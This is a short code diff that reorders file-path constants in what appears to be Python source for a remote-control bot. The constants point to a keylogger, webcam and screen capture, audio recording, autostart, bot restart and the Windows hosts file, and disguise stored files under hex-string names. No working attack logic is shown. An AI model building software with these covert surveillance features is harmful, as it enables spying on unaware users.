@@ -124,13 +124,13 @@ ENCODING = getencoding()
 FILE_ENCODING = 'UTF-8'
 FILE_BOT_RESTART = os.path.join(PATH_SYS, '0x3b8f1289273df19c')
 FILE_AUTOSTART = os.path.join(PATH_SYS, '0x79f2d2686b6da01e')
+FILE_APP_BLOCKER = os.path.join(PATH_TMP, '0x1f95051e7493c896')
+FILE_KEYLOGGER_FLAG = os.path.join(PATH_SYS, '0x2a47be6d04a14df5')
+FILE_KEYLOGGER = os.path.join(PATH_TMP, '0x4b0944084a778666')
 FILE_DXDIAG = os.path.join(PATH_TMP, '0x3c93cc8a140e3331.txt')
 FILE_SCREENSHOT = os.path.join(PATH_TMP, '0x1749063d3b828a7b')
 FILE_WEBCAM_SCREENSHOT = os.path.join(PATH_TMP, '0x59cb2f485e387a63')
 FILE_AUDIO = os.path.join(PATH_TMP, '0x78df1954620311d6')
-FILE_APP_BLOCKER = os.path.join(PATH_TMP, '0x1f95051e7493c896')
-FILE_KEYLOGGER_FLAG = os.path.join(PATH_SYS, '0x2a47be6d04a14df5')
-FILE_KEYLOGGER = os.path.join(PATH_TMP, '0x4b0944084a778666')
 FILE_HOSTS = os.path.join(SYSTEMDISK, 'Windows', 'System32', 'drivers', 'etc', 'hosts')
 
 EVENTLOG_CATEGORY = {
